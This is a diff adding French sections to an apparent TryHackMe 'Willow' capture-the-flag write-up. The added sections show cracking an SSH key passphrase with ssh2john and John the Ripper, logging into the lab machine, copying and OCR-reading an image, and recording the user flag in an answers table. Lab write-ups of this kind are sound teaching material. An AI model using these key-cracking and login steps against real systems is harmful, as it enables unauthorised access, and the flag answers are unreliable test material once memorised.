@@ -251,7 +251,100 @@ Le [RSA Express Encryption/Decryption Calculator](https://www.cs.drexel.edu/~pop
 
 ## \[Task 3] Prise pied sur la machine cible
 
+### Décryptage de la clé SSH
+
+```
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ ssh2john id_rsa > id_rsa_hash
+                                                                                                                       
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+wildflower       (id_rsa)     
+1g 0:00:00:00 DONE (2024-11-30 10:51) 7.142g/s 72228p/s 72228c/s 72228C/s chulita..simran
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Nous avons maintenant un utilisateur **willow** avec sa clé privée **id\_rsa** dont le password est **wildflower**
+
+### Prise pied sur la machine cible
+
+```
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ ssh -i id_rsa willow@$IP
+The authenticity of host '10.10.131.6 (10.10.131.6)' can't be established.
+ED25519 key fingerprint is SHA256:magOpLj2XlET5C4pPvsDHoHa4Po1iJpM2eNFkXQUZ2I.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:42: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.131.6' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+
+
+
+
+	"O take me in your arms, love
+	For keen doth the wind blow
+	O take me in your arms, love
+	For bitter is my deep woe."
+		 -The Willow Tree, English Folksong
+
+
+
+
+willow@willow-tree:~$ 
+
+```
+
+```
+willow@willow-tree:~$ ls -l
+total 48
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Desktop
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Documents
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Downloads
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Music
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Pictures
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Public
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Templates
+-rw-r--r-- 1 willow willow 12721 Jan 30  2020 user.jpg
+drwxr-xr-x 2 willow willow  4096 Jan 30  2020 Videos
+
+```
+
+Récupérons le fichier user.jpg sur notre machine kali
+
+```
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ scp -i id_rsa willow@$IP:/home/willow/user.jpg ./user.jpg
+Enter passphrase for key 'id_rsa': 
+user.jpg                                             100%   12KB 172.1KB/s   00:00    
+
+```
+
+<figure><img src=".gitbook/assets/user_jpg.png" alt=""><figcaption></figcaption></figure>
+
+Extrayons le texte de l'image avec tesseract (au besoin: sudo apt install tesseract-ocr)
+
+```
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ tesseract user.jpg output
+┌──(kali㉿kali)-[~/THM/willow]
+└─$ cat output.txt
+THM{beneath_the_weeping_willow_tree}
+```
+
 ## \[Task 4] Escalade de privilèges
 
 ## \[Task 5] Réponses aux questions
 
+
+
+<table><thead><tr><th width="281">Question</th><th>Réponse</th></tr></thead><tbody><tr><td>User Flag:</td><td><pre><code>THM{beneath_the_weeping_willow_tree}
+</code></pre></td></tr><tr><td></td><td></td></tr></tbody></table>
